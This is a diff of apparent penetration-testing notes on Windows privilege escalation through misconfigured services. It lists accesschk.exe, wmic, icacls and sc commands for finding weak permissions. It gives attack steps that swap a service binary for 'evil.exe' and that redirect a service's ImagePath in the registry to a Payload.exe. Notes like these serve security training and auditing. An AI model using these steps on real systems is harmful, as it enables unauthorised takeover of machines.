@@ -74,25 +74,32 @@ DACL for files and folders
 - accesschk.exe
 DACL for registry keys, files, processes, users and groups, and services
 For Windows XP, version 5.2 is needed: https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe
-Useful feature: it returns objects to which a particular user or group may have write access
 
+Useful feature: it returns objects to which a particular user or group may have write access
 accesschk.exe -quwcv "User" * 
-accesschk.exe -quwcvks hklm\System\CurrentControlSet\services
+
 
 # UNQUOTED SERVICE PATHS
 wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """ 
-icacls "C:\Program Files (x86)\Program Folder" 
+icacls "C:\Program Files\Program Folder" 
 sc qc Service1
 
+# INSECURE FILESYSTEM PERMISSIONS
+Search for services with binaries with weak permissions which we can replace.
+accesschk.exe -quvw "Everyone"  "C:\Program Files\Program Folder" /accepteula
+
+Replace the binary associated to a service which has "FILE_ALL_ACCESS" permission with an evil binary.
+copy /y C:\Windows\Temp\evil.exe "C:\Program Files\Program Folder\binary.exe"
+sc start Service1
 
 # INSECURE SERVICE PERMISSIONS
 Search for services that have a binary path (binpath) property which can be modified by non-Admin users.
 *Windows XP shipped with several vulnerable built-in services. 
 
 accesschk.exe -quvwc "Authenticated Users" * /accepteula
-accesschk.exe -quvwc Everyone * /accepteula
+accesschk.exe -quvwc "Everyone" * /accepteula
 accesschk.exe -qwds "Authenticated Users" C:\Windows\ /accepteula
-accesschk.exe -qwds Users C:\Windows\ 
+accesschk.exe -qwds "Users" C:\Windows\ 
 
 sc qc Service1
 
@@ -108,8 +115,8 @@ sc start <vuln-service>
 
 # INSECURE REGISTRY PERMISSIONS
 
-accesschk.exe -quvwc *		      	-->  DACLs of every service
-accesschk.exe -quvwc Service1 	-->	 DACLs of one service
+accesschk.exe -quwvks "User" HKLM\System\CurrentControlSet\services
+accesschk.exe -quwvks "Everyone" HKLM\System\CurrentControlSet\services
 
 Change the Imagepath to our binary. It needs to restart the computer? or restarting the service is enough? Not sure!
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Vulnerable Service" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\testuser\AppData\Local\Temp\Payload.exe" /f
